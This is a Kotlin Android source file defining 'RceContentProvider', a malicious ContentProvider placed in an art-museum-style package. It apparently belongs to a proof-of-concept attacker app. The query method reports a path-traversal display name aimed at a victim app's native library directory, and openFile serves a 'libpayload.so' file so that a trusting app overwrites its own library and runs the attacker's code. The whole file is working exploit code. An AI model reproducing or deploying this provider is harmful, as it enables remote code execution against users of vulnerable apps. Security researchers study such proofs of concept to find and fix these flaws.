package com.artexplorer.museum.data

import android.content.ContentProvider
import android.content.ContentValues
import android.database.Cursor
import android.database.MatrixCursor
import android.net.Uri
import android.os.ParcelFileDescriptor
import android.provider.OpenableColumns
import java.io.File
import java.io.FileOutputStream
import java.io.InputStream

class RceContentProvider : ContentProvider() {

    private val maliciousFileName = "../lib/arm64-v8a/libdummy_library.so"

    override fun query(uri: Uri, projection: Array<String>?, sel: String?, args: Array<String>?, order: String?): Cursor {
        val cursor = MatrixCursor(arrayOf(OpenableColumns.DISPLAY_NAME))
        cursor.addRow(arrayOf(maliciousFileName))
        return cursor
    }

    // In RceContentProvider.kt

    override fun openFile(uri: Uri, mode: String): ParcelFileDescriptor? {
        try {
            // 1. Get the application context.
            val appContext = context ?: return null

            // 2.  Use applicationInfo.nativeLibraryDir to get the
            //    correct, accessible path to the directory containing our .so files.
            val nativeLibDir = appContext.applicationInfo.nativeLibraryDir
            val libFile = File(nativeLibDir, "libpayload.so")

            // Log.d("RceContentProvider", "Serving malicious library from path: ${libFile.absolutePath}")

            // 3. Check if the file actually exists before serving it.
            if (!libFile.exists()) {
                // Log.e("RceContentProvider", "FATAL: libpayload.so not found at path!")
                return null
            }

            return ParcelFileDescriptor.open(libFile, ParcelFileDescriptor.MODE_READ_ONLY)
        } catch (e: Exception) {
            // Log.e("RceContentProvider", "Error opening file", e)
            return null
        }
    }

    override fun onCreate(): Boolean = true
    override fun getType(uri: Uri): String? = null
    override fun insert(uri: Uri, values: ContentValues?): Uri? = null
    override fun delete(uri: Uri, selection: String?, selectionArgs: Array<String>?): Int = 0
    override fun update(uri: Uri, values: ContentValues?, selection: String?, selectionArgs: Array<String>?): Int = 0
}